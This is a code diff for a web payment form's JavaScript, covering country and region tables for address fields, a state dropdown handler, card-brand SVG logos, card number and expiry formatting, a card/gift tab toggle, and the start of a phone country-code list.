+  LY:{stateLabel:'District',pinLabel:'Postal code',states:['Al Butnan','Al Jabal al Akhdar','Al Jabal al Gharbi','Al Jafara','Al Jufra','Al Kufra','Al Marj','Al Marqab','Al Murzuq','Al Nuqat al Khams','Al Wahat','Az Zawiya','Benghazi','Derna','Ghat','Misrata','Murzuq','Nalut','Sabha','Sirt','Tripoli','Wadi al Hayaa','Wadi al Shatii','Zuwarah']},
+  LT:{stateLabel:'County',pinLabel:'Postal code',states:['Alytus','Kaunas','Klaipėda','Marijampolė','Panevėžys','Šiauliai','Tauragė','Telšiai','Utena','Vilnius']},
+  LU:{stateLabel:'District',pinLabel:'Postal code',states:['Diekirch','Grevenmacher','Luxembourg']},
+  MG:{stateLabel:'Province',pinLabel:'Postal code',states:['Antananarivo','Antsiranana','Fianarantsoa','Mahajanga','Toamasina','Toliara']},
+  MW:{stateLabel:'Region / District',pinLabel:'Postal code',states:['Balaka','Blantyre','Chikwawa','Chiradzulu','Chitipa','Dedza','Dowa','Karonga','Kasungu','Likoma','Lilongwe','Machinga','Mangochi','Mchinji','Mulanje','Mwanza','Mzimba','Nkhata Bay','Nkhotakota','Nsanje','Ntcheu','Ntchisi','Phalombe','Rumphi','Salima','Thyolo','Zomba']},
+  MY:{stateLabel:'State',pinLabel:'Postal code',states:['Johor','Kedah','Kelantan','Kuala Lumpur','Labuan','Melaka','Negeri Sembilan','Pahang','Penang','Perak','Perlis','Putrajaya','Sabah','Sarawak','Selangor','Terengganu']},
+  MV:{stateLabel:'Atoll',pinLabel:'Postal code',states:['Addu City','Alif Alif','Alif Dhaal','Baa','Dhaalu','Faafu','Gaafu Alif','Gaafu Dhaal','Gnaviyani','Haa Alif','Haa Dhaal','Kaafu','Laamu','Lhaviyani','Malé','Meemu','Noonu','Raa','Seenu','Shaviyani','Thaa','Vaavu']},
+  MX:{stateLabel:'State',pinLabel:'Postal code',states:['Aguascalientes','Baja California','Baja California Sur','Campeche','Chiapas','Chihuahua','Coahuila','Colima','Durango','Guanajuato','Guerrero','Hidalgo','Jalisco','Mexico City','Mexico State','Michoacán','Morelos','Nayarit','Nuevo León','Oaxaca','Puebla','Querétaro','Quintana Roo','San Luis Potosí','Sinaloa','Sonora','Tabasco','Tamaulipas','Tlaxcala','Veracruz','Yucatán','Zacatecas']},
+  MD:{stateLabel:'District',pinLabel:'Postal code',states:['Anenii Noi','Basarabeasca','Briceni','Cahul','Călărași','Cantemir','Căușeni','Cimișlia','Criuleni','Dondușeni','Drochia','Dubăsari','Edineț','Fălești','Florești','Glodeni','Hîncești','Ialoveni','Leova','Nisporeni','Ocnița','Orhei','Rezina','Rîșcani','Sîngerei','Șoldănești','Soroca','Ștefan Vodă','Strășeni','Taraclia','Telenești','Ungheni','Chișinău','Bălți','Gagauzia','Transnistria']},
+  MN:{stateLabel:'Province (Aimag)',pinLabel:'Postal code',states:['Arkhangai','Bayan-Ölgii','Bayankhongor','Bulgan','Darkhan-Uul','Dornod','Dornogovi','Dundgovi','Govi-Altai','Govisümber','Khentii','Khövsgöl','Khovd','Orkhon','Övörkhangai','Selenge','Sükhbaatar','Töv','Ulaanbaatar','Uvs','Zavkhan']},
+  MA:{stateLabel:'Region',pinLabel:'Postal code',states:['Béni Mellal-Khénifra','Casablanca-Settat','Drâa-Tafilalet','Fès-Meknès','Guelmim-Oued Noun','Laâyoune-Sakia El Hamra','Marrakech-Safi','Oriental','Rabat-Salé-Kénitra','Souss-Massa','Tanger-Tétouan-Al Hoceïma']},
+  MZ:{stateLabel:'Province',pinLabel:'Postal code',states:['Cabo Delgado','Gaza','Inhambane','Manica','Maputo','Maputo City','Nampula','Niassa','Sofala','Tete','Zambézia']},
+  MM:{stateLabel:'State / Region',pinLabel:'Postal code',states:['Ayeyarwady','Bago','Chin','Kachin','Kayah','Kayin','Magway','Mandalay','Mon','Naypyidaw','Rakhine','Sagaing','Shan','Tanintharyi','Yangon']},
+  NA:{stateLabel:'Region',pinLabel:'Postal code',states:['Erongo','Hardap','//Karas','Kavango East','Kavango West','Khomas','Kunene','Ohangwena','Omaheke','Omusati','Oshana','Oshikoto','Otjozondjupa','Zambezi']},
+  NP:{stateLabel:'Province',pinLabel:'Postal code',states:['Bagmati','Gandaki','Karnali','Koshi','Lumbini','Madhesh','Sudurpashchim']},
+  NL:{stateLabel:'Province',pinLabel:'Postal code',states:['Drenthe','Flevoland','Friesland','Gelderland','Groningen','Limburg','North Brabant','North Holland','Overijssel','South Holland','Utrecht','Zeeland']},
+  NZ:{stateLabel:'Region',pinLabel:'Postcode',states:['Auckland','Bay of Plenty','Canterbury','Gisborne','Hawke\'s Bay','Manawatū-Whanganui','Marlborough','Nelson','Northland','Otago','Southland','Taranaki','Tasman','Waikato','Wellington','West Coast']},
+  NI:{stateLabel:'Department',pinLabel:'Postal code',states:['Boaco','Carazo','Chinandega','Chontales','Estelí','Granada','Jinotega','León','Madriz','Managua','Masaya','Matagalpa','Nueva Segovia','Río San Juan','Rivas','North Caribbean Coast','South Caribbean Coast']},
+  NG:{stateLabel:'State',pinLabel:'Postal code',states:['Abia','Adamawa','Akwa Ibom','Anambra','Bauchi','Bayelsa','Benue','Borno','Cross River','Delta','Ebonyi','Edo','Ekiti','Enugu','FCT - Abuja','Gombe','Imo','Jigawa','Kaduna','Kano','Katsina','Kebbi','Kogi','Kwara','Lagos','Nasarawa','Niger','Ogun','Ondo','Osun','Oyo','Plateau','Rivers','Sokoto','Taraba','Yobe','Zamfara']},
+  NO:{stateLabel:'County',pinLabel:'Postal code',states:['Agder','Innlandet','Møre og Romsdal','Nordland','Oslo','Rogaland','Troms og Finnmark','Trøndelag','Vestfold og Telemark','Vestland','Viken']},
+  OM:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Ad Dakhiliyah','Al Buraimi','Al Wusta','Az Zahirah','Dhofar','Musandam','Muscat','North Al Batinah','North Ash Sharqiyah','South Al Batinah','South Ash Sharqiyah']},
+  PK:{stateLabel:'Province',pinLabel:'Postal code',states:['Azad Kashmir','Balochistan','Gilgit-Baltistan','Islamabad Capital Territory','Khyber Pakhtunkhwa','Punjab','Sindh']},
+  PA:{stateLabel:'Province',pinLabel:'Postal code',states:['Bocas del Toro','Chiriquí','Coclé','Colón','Darién','Emberá-Wounaan','Guna Yala','Herrera','Los Santos','Ngäbe-Buglé','Panama','Panama Oeste','Veraguas']},
+  PG:{stateLabel:'Province',pinLabel:'Postal code',states:['Bougainville','Central','Chimbu','East New Britain','East Sepik','Eastern Highlands','Enga','Gulf','Hela','Jiwaka','Madang','Manus','Milne Bay','Morobe','National Capital District','New Ireland','Northern','Southern Highlands','West New Britain','West Sepik','Western','Western Highlands']},
+  PY:{stateLabel:'Department',pinLabel:'Postal code',states:['Alto Paraguay','Alto Paraná','Amambay','Asunción','Boquerón','Caaguazú','Caazapá','Canindeyú','Central','Concepción','Cordillera','Guairá','Itapúa','Misiones','Ñeembucú','Paraguarí','Presidente Hayes','San Pedro']},
+  PE:{stateLabel:'Region',pinLabel:'Postal code',states:['Amazonas','Ancash','Apurímac','Arequipa','Ayacucho','Cajamarca','Callao','Cusco','Huancavelica','Huánuco','Ica','Junín','La Libertad','Lambayeque','Lima','Loreto','Madre de Dios','Moquegua','Pasco','Piura','Puno','San Martín','Tacna','Tumbes','Ucayali']},
+  PH:{stateLabel:'Region',pinLabel:'Postal code',states:['Bicol','Cagayan Valley','Calabarzon','Caraga','Central Luzon','Central Visayas','Cordillera Administrative Region','Davao','Eastern Visayas','MIMAROPA','National Capital Region','Northern Mindanao','SOCCSKSARGEN','Western Visayas','Zamboanga Peninsula','Bangsamoro']},
+  PL:{stateLabel:'Voivodeship',pinLabel:'Postal code',states:['Greater Poland','Holy Cross','Kuyavian-Pomeranian','Lesser Poland','Łódź','Lower Silesian','Lublin','Lubusz','Masovian','Opole','Podkarpackie','Podlaskie','Pomeranian','Silesian','Warmian-Masurian','West Pomeranian']},
+  PT:{stateLabel:'District / Region',pinLabel:'Postal code',states:['Aveiro','Azores','Beja','Braga','Bragança','Castelo Branco','Coimbra','Évora','Faro','Guarda','Leiria','Lisbon','Madeira','Portalegre','Porto','Santarém','Setúbal','Viana do Castelo','Vila Real','Viseu']},
+  QA:{stateLabel:'Municipality',pinLabel:'Postal code',states:['Al Daayen','Al Khor','Al Rayyan','Al Shamal','Al Wakrah','Doha','Madinat ash Shamal','Umm Salal']},
+  RO:{stateLabel:'County',pinLabel:'Postal code',states:['Alba','Arad','Argeș','Bacău','Bihor','Bistrița-Năsăud','Botoșani','Brăila','Brașov','Bucharest','Buzău','Călărași','Caraș-Severin','Cluj','Constanța','Covasna','Dâmbovița','Dolj','Galați','Giurgiu','Gorj','Harghita','Hunedoara','Ialomița','Iași','Ilfov','Maramureș','Mehedinți','Mureș','Neamț','Olt','Prahova','Satu Mare','Sălaj','Sibiu','Suceava','Teleorman','Timiș','Tulcea','Vâlcea','Vaslui','Vrancea']},
+  RU:{stateLabel:'Federal Subject',pinLabel:'Postal code',states:['Adygea','Altai Krai','Altai Republic','Amur','Arkhangelsk','Astrakhan','Bashkortostan','Belgorod','Bryansk','Buryatia','Chechnya','Chelyabinsk','Chukotka','Chuvashia','Dagestan','Ingushetia','Irkutsk','Ivanovo','Jewish Autonomous Oblast','Kabardino-Balkaria','Kaliningrad','Kalmykia','Kaluga','Kamchatka','Karachay-Cherkessia','Karelia','Kemerovo','Khabarovsk','Khakassia','Khanty-Mansi','Kirov','Komi','Kostroma','Krasnodar','Krasnoyarsk','Kurgan','Kursk','Leningrad','Lipetsk','Magadan','Mari El','Mordovia','Moscow','Moscow Oblast','Murmansk','Nenets','Nizhny Novgorod','North Ossetia','Novgorod','Novosibirsk','Omsk','Orenburg','Oryol','Penza','Perm','Primorsky','Pskov','Rostov','Ryazan','Sakha','Sakhalin','Samara','Saratov','Smolensk','St. Petersburg','Stavropol','Sverdlovsk','Tambov','Tatarstan','Tomsk','Tula','Tuva','Tver','Tyumen','Udmurtia','Ulyanovsk','Vladimir','Volgograd','Vologda','Voronezh','Yamalo-Nenets','Yaroslavl','Zabaykalsky']},
+  SA:{stateLabel:'Province',pinLabel:'Postal code',states:['Al Bahah','Al Jawf','Al Madinah','Al Qassim','Asir','Eastern Province','Ha\'il','Jizan','Makkah','Najran','Northern Borders','Riyadh','Tabuk']},
+  SN:{stateLabel:'Region',pinLabel:'Postal code',states:['Dakar','Diourbel','Fatick','Kaffrine','Kaolack','Kédougou','Kolda','Louga','Matam','Saint-Louis','Sédhiou','Tambacounda','Thiès','Ziguinchor']},
+  RS:{stateLabel:'District',pinLabel:'Postal code',states:['Belgrade','Bor','Braničevo','Jablanica','Kolubara','Mačva','Moravica','Nišava','Pčinja','Pirot','Podunavlje','Pomoravlje','Rasina','Rašk','South Bačka','South Banat','Srem','Šumadija','Toplica','Vojvodina','Zaječar','Zlatibor','Kosovo and Metohija']},
+  SG:{stateLabel:'Region',pinLabel:'Postal code',states:['Central Region','East Region','North Region','North-East Region','West Region']},
+  SK:{stateLabel:'Region',pinLabel:'Postal code',states:['Banská Bystrica','Bratislava','Košice','Nitra','Prešov','Trenčín','Trnava','Žilina']},
+  SI:{stateLabel:'Statistical Region',pinLabel:'Postal code',states:['Central Slovenia','Coastal–Karst','Drava','Gorenjska','Gorizia','Inner Carniola–Karst','Littoral–Inner Carniola','Lower Sava','Mura','Posavje','Savinja','Southeast Slovenia','Upper Carniola','Zasavje']},
+  ZA:{stateLabel:'Province',pinLabel:'Postal code',states:['Eastern Cape','Free State','Gauteng','KwaZulu-Natal','Limpopo','Mpumalanga','North West','Northern Cape','Western Cape']},
+  KR:{stateLabel:'Province / City',pinLabel:'Postal code',states:['Busan','Chungcheongbuk-do','Chungcheongnam-do','Daegu','Daejeon','Gangwon-do','Gwangju','Gyeonggi-do','Gyeongsangbuk-do','Gyeongsangnam-do','Incheon','Jeju','Jeollabuk-do','Jeollanam-do','Sejong','Seoul','Ulsan']},
+  ES:{stateLabel:'Autonomous Community',pinLabel:'Postal code',states:['Andalusia','Aragon','Asturias','Balearic Islands','Basque Country','Canary Islands','Cantabria','Castile and León','Castilla-La Mancha','Catalonia','Ceuta','Extremadura','Galicia','La Rioja','Madrid','Melilla','Murcia','Navarre','Valencia']},
+  LK:{stateLabel:'Province',pinLabel:'Postal code',states:['Central','Eastern','North Central','North Western','Northern','Sabaragamuwa','Southern','Uva','Western']},
+  SE:{stateLabel:'County',pinLabel:'Postal code',states:['Blekinge','Dalarna','Gävleborg','Gotland','Halland','Jämtland','Jönköping','Kalmar','Kronoberg','Norrbotten','Örebro','Östergötland','Skåne','Södermanland','Stockholm','Uppsala','Värmland','Västerbotten','Västernorrland','Västmanland','Västra Götaland']},
+  CH:{stateLabel:'Canton',pinLabel:'Postal code',states:['Aargau','Appenzell Ausserrhoden','Appenzell Innerrhoden','Basel-Landschaft','Basel-Stadt','Bern','Fribourg','Geneva','Glarus','Graubünden','Jura','Lucerne','Neuchâtel','Nidwalden','Obwalden','Schaffhausen','Schwyz','Solothurn','St. Gallen','Thurgau','Ticino','Uri','Valais','Vaud','Zug','Zurich']},
+  SY:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Al-Hasakah','Al-Raqqah','Aleppo','As-Suwayda','Damascus','Daraa','Deir ez-Zor','Hama','Homs','Idlib','Latakia','Quneitra','Rif Dimashq','Tartus']},
+  TW:{stateLabel:'County / City',pinLabel:'Postal code',states:['Changhua','Chiayi City','Chiayi County','Hsinchu City','Hsinchu County','Hualien','Kaohsiung','Keelung','Kinmen','Lienchiang','Miaoli','Nantou','New Taipei','Penghu','Pingtung','Taichung','Tainan','Taipei','Taitung','Taoyuan','Yilan','Yunlin']},
+  TJ:{stateLabel:'Region',pinLabel:'Postal code',states:['Dushanbe','Gorno-Badakhshan','Khatlon','Sughd','Districts of Republican Subordination']},
+  TZ:{stateLabel:'Region',pinLabel:'Postal code',states:['Arusha','Coast','Dar es Salaam','Dodoma','Geita','Iringa','Kagera','Katavi','Kigoma','Kilimanjaro','Lindi','Manyara','Mara','Mbeya','Mjini Magharibi','Morogoro','Mtwara','Mwanza','Njombe','Pemba North','Pemba South','Pwani','Rukwa','Ruvuma','Shinyanga','Simiyu','Singida','Songwe','Tabora','Tanga','Unguja North','Unguja South']},
+  TH:{stateLabel:'Province',pinLabel:'Postal code',states:['Amnat Charoen','Ang Thong','Bangkok','Bueng Kan','Buri Ram','Chachoengsao','Chai Nat','Chaiyaphum','Chanthaburi','Chiang Mai','Chiang Rai','Chon Buri','Chumphon','Kalasin','Kamphaeng Phet','Kanchanaburi','Khon Kaen','Krabi','Lampang','Lamphun','Loei','Lop Buri','Mae Hong Son','Maha Sarakham','Mukdahan','Nakhon Nayok','Nakhon Pathom','Nakhon Phanom','Nakhon Ratchasima','Nakhon Sawan','Nakhon Si Thammarat','Nan','Narathiwat','Nong Bua Lam Phu','Nong Khai','Nonthaburi','Pathum Thani','Pattani','Phang Nga','Phatthalung','Phayao','Phetchabun','Phetchaburi','Phichit','Phitsanulok','Phra Nakhon Si Ayutthaya','Phrae','Phuket','Prachin Buri','Prachuap Khiri Khan','Ranong','Ratchaburi','Rayong','Roi Et','Sa Kaeo','Sakon Nakhon','Samut Prakan','Samut Sakhon','Samut Songkhram','Saraburi','Satun','Sing Buri','Sisaket','Songkhla','Sukhothai','Suphan Buri','Surat Thani','Surin','Tak','Trang','Trat','Ubon Ratchathani','Udon Thani','Uthai Thani','Uttaradit','Yala','Yasothon']},
+  TN:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Ariana','Beja','Ben Arous','Bizerte','Gabès','Gafsa','Jendouba','Kairouan','Kasserine','Kebili','Kef','Mahdia','Manouba','Medenine','Monastir','Nabeul','Sfax','Sidi Bouzid','Siliana','Sousse','Tataouine','Tozeur','Tunis','Zaghouan']},
+  TR:{stateLabel:'Province (İl)',pinLabel:'Postal code',states:['Adana','Adıyaman','Afyonkarahisar','Ağrı','Amasya','Ankara','Antalya','Artvin','Aydın','Balıkesir','Bilecik','Bingöl','Bitlis','Bolu','Burdur','Bursa','Çanakkale','Çankırı','Çorum','Denizli','Diyarbakır','Düzce','Edirne','Elazığ','Erzincan','Erzurum','Eskişehir','Gaziantep','Giresun','Gümüşhane','Hakkari','Hatay','Iğdır','Isparta','Istanbul','İzmir','Kahramanmaraş','Karabük','Karaman','Kars','Kastamonu','Kayseri','Kilis','Kırıkkale','Kırklareli','Kırşehir','Kocaeli','Konya','Kütahya','Malatya','Manisa','Mardin','Mersin','Muğla','Muş','Nevşehir','Niğde','Ordu','Osmaniye','Rize','Sakarya','Samsun','Şanlıurfa','Siirt','Sinop','Şırnak','Sivas','Tekirdağ','Tokat','Trabzon','Tunceli','Uşak','Van','Yalova','Yozgat','Zonguldak']},
+  TM:{stateLabel:'Province',pinLabel:'Postal code',states:['Ahal','Ashgabat','Balkan','Daşoguz','Lebap','Mary']},
+  UA:{stateLabel:'Oblast',pinLabel:'Postal code',states:['Cherkasy','Chernihiv','Chernivtsi','Crimea','Dnipropetrovsk','Donetsk','Ivano-Frankivsk','Kharkiv','Kherson','Khmelnytskyi','Kirovohrad','Kyiv','Kyiv City','Luhansk','Lviv','Mykolaiv','Odessa','Poltava','Rivne','Sevastopol','Sumy','Ternopil','Vinnytsia','Volyn','Zakarpattia','Zaporizhzhia','Zhytomyr']},
+  AE:{stateLabel:'Emirate',pinLabel:'Postal code',states:['Abu Dhabi','Ajman','Dubai','Fujairah','Ras Al Khaimah','Sharjah','Umm Al Quwain']},
+  GB:{stateLabel:'County / Region',pinLabel:'Postcode',states:['Bedfordshire','Berkshire','Bristol','Buckinghamshire','Cambridgeshire','Cheshire','City of London','Cornwall','Cumbria','Derbyshire','Devon','Dorset','Durham','East Riding of Yorkshire','East Sussex','Essex','Gloucestershire','Greater London','Greater Manchester','Hampshire','Herefordshire','Hertfordshire','Isle of Wight','Kent','Lancashire','Leicestershire','Lincolnshire','Merseyside','Norfolk','North Yorkshire','Northamptonshire','Northumberland','Nottinghamshire','Oxfordshire','Rutland','Shropshire','Somerset','South Yorkshire','Staffordshire','Suffolk','Surrey','Tyne and Wear','Warwickshire','West Midlands','West Sussex','West Yorkshire','Wiltshire','Worcestershire','Aberdeenshire','Angus','Argyll and Bute','City of Aberdeen','City of Dundee','City of Edinburgh','City of Glasgow','Clackmannanshire','Dumfries and Galloway','East Ayrshire','East Dunbartonshire','East Lothian','East Renfrewshire','Falkirk','Fife','Highland','Inverclyde','Midlothian','Moray','North Ayrshire','North Lanarkshire','Orkney Islands','Perth and Kinross','Renfrewshire','Scottish Borders','Shetland Islands','South Ayrshire','South Lanarkshire','Stirling','West Dunbartonshire','West Lothian','Western Isles','Antrim','Armagh','Belfast','Down','Fermanagh','Londonderry','Tyrone','Blaenau Gwent','Bridgend','Caerphilly','Cardiff','Carmarthenshire','Ceredigion','Conwy','Denbighshire','Flintshire','Gwynedd','Isle of Anglesey','Merthyr Tydfil','Monmouthshire','Neath Port Talbot','Newport','Pembrokeshire','Powys','Rhondda Cynon Taf','Swansea','Torfaen','Vale of Glamorgan','Wrexham']},
+  US:{stateLabel:'State',pinLabel:'ZIP code',states:['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky','Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington','West Virginia','Wisconsin','Wyoming','District of Columbia','Puerto Rico','Guam','U.S. Virgin Islands','American Samoa','Northern Mariana Islands']},
+  UY:{stateLabel:'Department',pinLabel:'Postal code',states:['Artigas','Canelones','Cerro Largo','Colonia','Durazno','Flores','Florida','Lavalleja','Maldonado','Montevideo','Paysandú','Río Negro','Rivera','Rocha','Salto','San José','Soriano','Tacuarembó','Treinta y Tres']},
+  UZ:{stateLabel:'Region',pinLabel:'Postal code',states:['Andijan','Bukhara','Fergana','Jizzakh','Karakalpakstan','Kashkadarya','Khorezm','Namangan','Navoiy','Samarkand','Sirdaryo','Surkhandarya','Tashkent','Tashkent City']},
+  VE:{stateLabel:'State',pinLabel:'Postal code',states:['Amazonas','Anzoátegui','Apure','Aragua','Barinas','Bolívar','Carabobo','Cojedes','Delta Amacuro','Distrito Capital','Falcón','Guárico','La Guaira','Lara','Mérida','Miranda','Monagas','Nueva Esparta','Portuguesa','Sucre','Táchira','Trujillo','Yaracuy','Zulia']},
+  VN:{stateLabel:'Province / Municipality',pinLabel:'Postal code',states:['An Giang','Bà Rịa–Vũng Tàu','Bắc Giang','Bắc Kạn','Bạc Liêu','Bắc Ninh','Bến Tre','Bình Định','Bình Dương','Bình Phước','Bình Thuận','Cà Mau','Cần Thơ','Cao Bằng','Đà Nẵng','Đắk Lắk','Đắk Nông','Điện Biên','Đồng Nai','Đồng Tháp','Gia Lai','Hà Giang','Hà Nam','Hà Nội','Hà Tĩnh','Hải Dương','Hải Phòng','Hậu Giang','Hòa Bình','Hồ Chí Minh','Hưng Yên','Khánh Hòa','Kiên Giang','Kon Tum','Lai Châu','Lạng Sơn','Lào Cai','Lâm Đồng','Long An','Nam Định','Nghệ An','Ninh Bình','Ninh Thuận','Phú Thọ','Phú Yên','Quảng Bình','Quảng Nam','Quảng Ngãi','Quảng Ninh','Quảng Trị','Sóc Trăng','Sơn La','Tây Ninh','Thái Bình','Thái Nguyên','Thanh Hóa','Thừa Thiên Huế','Tiền Giang','Trà Vinh','Tuyên Quang','Vĩnh Long','Vĩnh Phúc','Yên Bái']},
+  YE:{stateLabel:'Governorate',pinLabel:'Postal code',states:['Abyan','Aden','Al Bayda','Al Dhale\'e','Al Hudaydah','Al Jawf','Al Mahrah','Al Mahwit','Amran','Dhamar','Hadramawt','Hajjah','Ibb','Lahij','Marib','Raymah','Saada','Sana\'a','Sana\'a City','Shabwah','Socotra','Taizz']},
+  ZM:{stateLabel:'Province',pinLabel:'Postal code',states:['Central','Copperbelt','Eastern','Luapula','Lusaka','Muchinga','Northern','North-Western','Southern','Western']},
+  ZW:{stateLabel:'Province',pinLabel:'Postal code',states:['Bulawayo','Harare','Manicaland','Mashonaland Central','Mashonaland East','Mashonaland West','Masvingo','Matabeleland North','Matabeleland South','Midlands']}
+};
+
+function onCountryChange(sel) {
+  sel.classList.add('has-value');
+  clearErr('w_bCountry','e_bCountry');
+
+  const code = sel.value;
+  const data = COUNTRY_DATA[code];
+  const stateWrap = document.getElementById('stateWrap');
+  const stateEl   = document.getElementById('bState');
+  const stateLabel = document.getElementById('stateLabel');
+  const pinLabel   = document.getElementById('pinLabel');
+
+  // Update PIN label
+  if (data) pinLabel.textContent = data.pinLabel;
+
+  if (data && data.states.length > 0) {
+    // Populate state dropdown
+    stateEl.innerHTML = '<option value="" disabled selected></option>';
+    data.states.forEach(s => {
+      const opt = document.createElement('option');
+      opt.value = s; opt.textContent = s;
+      stateEl.appendChild(opt);
+    });
+    stateEl.classList.remove('has-value');
+    stateEl.value = '';
+    stateLabel.textContent = data.stateLabel;
+    // Animate in
+    stateWrap.style.display = 'block';
+    stateWrap.style.animation = 'fadeUp 0.25s ease both';
+  } else {
+    stateWrap.style.display = 'none';
+  }
+}
+
+
+// Each is a compact SVG sized 44×28 to fit inside the input
+const BRAND_LOGOS = {
+  visa: `<svg viewBox="0 0 44 28" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+    <text x="1" y="22" font-family="Arial,sans-serif" font-size="17" font-weight="900"
+      font-style="italic" fill="#fff" letter-spacing="-1" opacity="0.95">VISA</text>
+  </svg>`,
+
+  mastercard: `<svg viewBox="0 0 44 28" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="16" cy="14" r="11" fill="#eb001b" opacity="0.95"/>
+    <circle cx="28" cy="14" r="11" fill="#f79e1b" opacity="0.95"/>
+    <path d="M22 4.8a11 11 0 0 1 0 18.4 11 11 0 0 1 0-18.4z" fill="#ff5f00" opacity="0.9"/>
+  </svg>`,
+
+  amex: `<svg viewBox="0 0 44 28" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+    <rect width="44" height="28" rx="4" fill="rgba(70,160,220,0.25)"/>
+    <text x="3" y="11" font-family="Arial,sans-serif" font-size="6" font-weight="700"
+      fill="#7ec8e3" letter-spacing="0.3">AMERICAN</text>
+    <text x="3" y="21" font-family="Arial,sans-serif" font-size="6" font-weight="700"
+      fill="#7ec8e3" letter-spacing="0.3">EXPRESS</text>
+  </svg>`,
+
+  discover: `<svg viewBox="0 0 44 28" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+    <rect width="44" height="28" rx="4" fill="rgba(255,255,255,0.06)"/>
+    <circle cx="32" cy="14" r="11" fill="#f76f20" opacity="0.9"/>
+    <text x="2" y="17" font-family="Arial,sans-serif" font-size="5.5" font-weight="700"
+      fill="#ddd" letter-spacing="0.1">DISC</text>
+  </svg>`,
+
+  rupay: `<svg viewBox="0 0 44 28" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
+    <rect width="44" height="28" rx="4" fill="rgba(255,255,255,0.06)"/>
+    <text x="3" y="20" font-family="Arial,sans-serif" font-size="11" font-weight="800"
+      fill="#fff" opacity="0.9">RuPay</text>
+  </svg>`
+};
+
+function detectBrand(raw) {
+  if (/^4/.test(raw))               return 'visa';
+  if (/^5[1-5]|^2[2-7]/.test(raw)) return 'mastercard';
+  if (/^3[47]/.test(raw))           return 'amex';
+  if (/^6(?:011|5)/.test(raw))      return 'discover';
+  if (/^6[07-9]|^81/.test(raw))     return 'rupay';
+  return null; // unknown → no logo
+}
+
+// Update the inline brand logo inside the card number field
+function updateInlineBrand(raw) {
+  const el = document.getElementById('cardNumBrand');
+  const brand = detectBrand(raw);
+  if (brand && raw.length > 0) {
+    el.innerHTML = BRAND_LOGOS[brand];
+    el.style.opacity = '1';
+  } else {
+    el.innerHTML = '';
+  }
+}
+
+// ── Tab toggle ────────────────────────────────────────────────
+function setTab(tab) {
+  const isCard = tab === 'card';
+  document.getElementById('tabCard').classList.toggle('active', isCard);
+  document.getElementById('tabGift').classList.toggle('active', !isCard);
+  document.getElementById('cardPanel').style.display = isCard ? 'block' : 'none';
+  document.getElementById('giftPanel').style.display = isCard ? 'none' : 'block';
+}
+
+// ── Card number format + inline brand detect ──────────────────
+function fmtCard(input) {
+  let raw = input.value.replace(/\D/g,'').substring(0,16);
+  input.value = raw.match(/.{1,4}/g)?.join(' ') || raw;
+  updateInlineBrand(raw);
+}
+
+// ── Expiry formatting ─────────────────────────────────────────
+function fmtExpiry(input) {
+  let raw = input.value.replace(/\D/g,'').substring(0,4);
+  if (raw.length >= 3) raw = raw.slice(0,2) + ' / ' + raw.slice(2);
+  input.value = raw;
+}
+
+// ── Error helpers ─────────────────────────────────────────────
+function v(id) { return document.getElementById(id).value.trim(); }
+
+function showErr(wid, eid) {
+  const w = document.getElementById(wid);
+  w.classList.add('has-error');
+  const inp = w.querySelector('input,select');
+  if (inp) inp.classList.add('error-input');
+  document.getElementById(eid).classList.add('show');
+}
+
+// Phone country dropdown
+const PHONE_COUNTRIES = [
+  {f:'🇦🇫',n:'Afghanistan',c:'+93'},{f:'🇦🇱',n:'Albania',c:'+355'},{f:'🇩🇿',n:'Algeria',c:'+213'},
+  {f:'🇦🇩',n:'Andorra',c:'+376'},{f:'🇦🇴',n:'Angola',c:'+244'},{f:'🇦🇷',n:'Argentina',c:'+54'},
+  {f:'🇦🇲',n:'Armenia',c:'+374'},{f:'🇦🇺',n:'Australia',c:'+61'},{f:'🇦🇹',n:'Austria',c:'+43'},
+  {f:'🇦🇿',n:'Azerbaijan',c:'+994'},{f:'🇧🇭',n:'Bahrain',c:'+973'},{f:'🇧🇩',n:'Bangladesh',c:'+880'},
+  {f:'🇧🇾',n:'Belarus',c:'+375'},{f:'🇧🇪',n:'Belgium',c:'+32'},{f:'🇧🇿',n:'Belize',c:'+501'},
+  {f:'🇧🇯',n:'Benin',c:'+229'},{f:'🇧🇹',n:'Bhutan',c:'+975'},{f:'🇧🇴',n:'Bolivia',c:'+591'},
+  {f:'🇧🇦',n:'Bosnia & Herzegovina',c:'+387'},{f:'🇧🇼',n:'Botswana',c:'+267'},{f:'🇧🇷',n:'Brazil',c:'+55'},
+  {f:'🇧🇳',n:'Brunei',c:'+673'},{f:'🇧🇬',n:'Bulgaria',c:'+359'},{f:'🇧🇫',n:'Burkina Faso',c:'+226'},
+  {f:'🇧🇮',n:'Burundi',c:'+257'},{f:'🇰🇭',n:'Cambodia',c:'+855'},{f:'🇨🇲',n:'Cameroon',c:'+237'},
+  {f:'🇨🇦',n:'Canada',c:'+1'},{f:'🇨🇻',n:'Cape Verde',c:'+238'},{f:'🇨🇫',n:'Central African Republic',c:'+236'},
+  {f:'🇹🇩',n:'Chad',c:'+235'},{f:'🇨🇱',n:'Chile',c:'+56'},{f:'🇨🇳',n:'China',c:'+86'},
+  {f:'🇨🇴',n:'Colombia',c:'+57'},{f:'🇰🇲',n:'Comoros',c:'+269'},{f:'🇨🇩',n:'Congo (DRC)',c:'+243'},
+  {f:'🇨🇬',n:'Congo (Republic)',c:'+242'},{f:'🇨🇷',n:'Costa Rica',c:'+506'},{f:'🇭🇷',n:'Croatia',c:'+385'},
+  {f:'🇨🇺',n:'Cuba',c:'+53'},{f:'🇨🇾',n:'Cyprus',c:'+357'},{f:'🇨🇿',n:'Czech Republic',c:'+420'},
